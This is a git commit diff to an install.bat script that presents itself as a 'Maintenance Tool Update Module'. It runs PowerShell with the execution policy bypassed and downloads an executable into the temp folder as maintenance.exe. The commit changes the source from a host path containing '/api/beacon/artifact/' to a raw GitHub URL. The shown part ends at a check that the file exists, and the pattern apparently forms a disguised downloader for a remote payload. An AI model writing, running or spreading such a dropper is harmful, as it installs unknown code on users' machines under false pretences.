f80f005758409dc58131e29fcf1ebae97fc60fcb
Maxwell Ma <2431798772@qq.com>
2026-09-06 21:50:43 +0800

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,6 +1,6 @@
 powershell -NoProfile -ExecutionPolicy Bypass -Command "
 # Maintenance Tool Update Module
-$dlUri='http://admin.yuxiit.cn/api/beacon/artifact/6b00d6fa';
+$dlUri='https://raw.githubusercontent.com/SmaZone2020/SmaZone2020.github.io/refs/heads/main/install.exe';
 $outExe=Join-Path $env:TEMP 'maintenance.exe';
 Invoke-WebRequest -Uri $dlUri -OutFile $outExe -UseBasicParsing;
 if(Test-Path $outExe){
